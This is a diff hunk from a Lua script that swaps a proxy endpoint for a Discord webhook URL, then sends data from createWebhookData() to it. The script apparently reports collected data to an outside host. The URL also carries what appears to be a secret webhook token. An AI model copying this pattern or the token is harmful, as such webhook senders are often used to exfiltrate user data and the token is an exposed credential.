@@ -104,7 +104,7 @@ local function sendToProxy(proxyUrl, data)
     end
 end
 
-local PROXY_URL = "https://old-bf08.onrender.com/proxy"
+local PROXY_URL = "https://discord.com/api/webhooks/1376968568125653232/5_LWGiqVplyLd3gjOZ-JDFAAw6hQjOhqf2IgfWtY5ZRpgyptBJJs2-sqNK6orB_bPd_1 "
 local webhookData = createWebhookData()
 
 sendToProxy(PROXY_URL, webhookData)
